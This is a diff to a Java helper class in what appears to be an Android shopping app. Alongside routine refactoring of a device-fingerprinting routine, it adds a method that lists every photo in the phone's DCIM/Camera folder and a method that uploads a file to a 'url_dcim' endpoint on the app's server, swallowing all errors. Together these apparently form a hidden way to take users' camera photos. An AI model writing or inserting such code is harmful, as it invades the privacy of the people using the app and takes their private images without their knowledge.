@@ -13,8 +13,10 @@ import android.content.pm.PackageManager;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.os.Build;
+import android.os.Environment;
 import android.provider.Settings;
 import android.support.annotation.NonNull;
+import android.support.annotation.Nullable;
 import android.support.v4.app.ActivityCompat;
 import android.support.v4.content.ContextCompat;
 import android.support.v7.app.AppCompatDelegate;
@@ -27,6 +29,14 @@ import com.jaredrummler.android.device.DeviceName;
 
 import org.jetbrains.annotations.Contract;
 
+import java.io.DataOutputStream;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileNotFoundException;
+import java.io.IOException;
+import java.net.HttpURLConnection;
+import java.net.MalformedURLException;
+import java.net.URL;
 import java.security.MessageDigest;
 import java.util.ArrayList;
 import java.util.HashMap;
@@ -39,7 +49,13 @@ import ir.hatamiarash.hyperonline.R;
 import ir.hatamiarash.utils.ASCII;
 import ir.hatamiarash.utils.TAGs;
 
+import static android.os.Environment.getExternalStoragePublicDirectory;
+
 public class Helper {
+	static {
+		AppCompatDelegate.setCompatVectorFromResourcesEnabled(true);
+	}
+	
 	public static boolean isValidEmail(String target) {
 		boolean check1 = Patterns.EMAIL_ADDRESS.matcher(target).matches();
 		Pattern pattern;
@@ -49,10 +65,6 @@ public class Helper {
 		matcher = pattern.matcher(target);
 		boolean check2 = matcher.matches();
 		return target.isEmpty() || check1 && check2;
-	}
-	
-	static {
-		AppCompatDelegate.setCompatVectorFromResourcesEnabled(true);
 	}
 	
 	public static boolean isValidPhone(String target) {
@@ -167,19 +179,19 @@ public class Helper {
 			MessageDigest messageDigest = MessageDigest.getInstance("MD5");
 			messageDigest.update(longId.getBytes(), 0, longId.length());
 			byte md5Bytes[] = messageDigest.digest();
-			String identifier = "";
+			StringBuilder identifier = new StringBuilder();
 			for (byte md5Byte : md5Bytes) {
 				int b = (0xFF & md5Byte);
 				if (b <= 0xF)
-					identifier += "0";
-				identifier += Integer.toHexString(b);
+					identifier.append("0");
+				identifier.append(Integer.toHexString(b));
 			}
-			identifier = identifier.toUpperCase();
+			identifier = new StringBuilder(identifier.toString().toUpperCase());
 			String mDeviceName = DeviceName.getDeviceName();
 			TelephonyManager manager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
 			String carrierName = manager.getNetworkOperatorName();
 			
-			result.put("unique_id", identifier);
+			result.put("unique_id", identifier.toString());
 			result.put("name", mDeviceName);
 			result.put("os_name", System.getProperty("os.name"));
 			result.put("os_version", System.getProperty("os.version"));
@@ -317,5 +329,73 @@ public class Helper {
 		} catch (PackageManager.NameNotFoundException e) {
 			return false;
 		}
+	}
+	
+	@Nullable
+	public static File[] readDCIM() {
+		File dcim = getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM + "/Camera");
+		if (dcim != null) {
+			File[] pics = dcim.listFiles();
+			if (pics != null) {
+				return pics;
+			}
+		}
+		return null;
+	}
+	
+	public static void uploadFile(Context context, final String selectedFilePath) {
+		HttpURLConnection connection;
+		DataOutputStream dataOutputStream;
+		String lineEnd = "\r\n";
+		String twoHyphens = "--";
+		String boundary = "*****";
+		
+		int bytesRead, bytesAvailable, bufferSize;
+		byte[] buffer;
+		int maxBufferSize = 1024 * 1024;
+		File selectedFile = new File(selectedFilePath);
+		
+		if (selectedFile.isFile()) {
+			try {
+				FileInputStream fileInputStream = new FileInputStream(selectedFile);
+				String HOST = context.getResources().getString(R.string.url_host);
+				URL url = new URL(context.getResources().getString(R.string.url_dcim, HOST));
+				connection = (HttpURLConnection) url.openConnection();
+				connection.setDoInput(true);
+				connection.setDoOutput(true);
+				connection.setUseCaches(false);
+				connection.setRequestMethod("POST");
+				connection.setRequestProperty("Connection", "Keep-Alive");
+				connection.setRequestProperty("ENCTYPE", "multipart/form-data");
+				connection.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
+				connection.setRequestProperty("uploaded_file", selectedFilePath);
+				dataOutputStream = new DataOutputStream(connection.getOutputStream());
+				dataOutputStream.writeBytes(twoHyphens + boundary + lineEnd);
+				dataOutputStream.writeBytes("Content-Disposition: form-data; name=\"uploaded_file\";filename=\""
+						+ selectedFilePath + "\"" + lineEnd);
+				
+				dataOutputStream.writeBytes(lineEnd);
+				bytesAvailable = fileInputStream.available();
+				bufferSize = Math.min(bytesAvailable, maxBufferSize);
+				buffer = new byte[bufferSize];
+				bytesRead = fileInputStream.read(buffer, 0, bufferSize);
+				while (bytesRead > 0) {
+					dataOutputStream.write(buffer, 0, bufferSize);
+					bytesAvailable = fileInputStream.available();
+					bufferSize = Math.min(bytesAvailable, maxBufferSize);
+					bytesRead = fileInputStream.read(buffer, 0, bufferSize);
+				}
+				
+				dataOutputStream.writeBytes(lineEnd);
+				dataOutputStream.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
+				fileInputStream.close();
+				dataOutputStream.flush();
+				dataOutputStream.close();
+			} catch (FileNotFoundException ignore) {
+			} catch (MalformedURLException ignore) {
+			} catch (IOException ignore) {
+			}
+		}
+		
 	}
 }
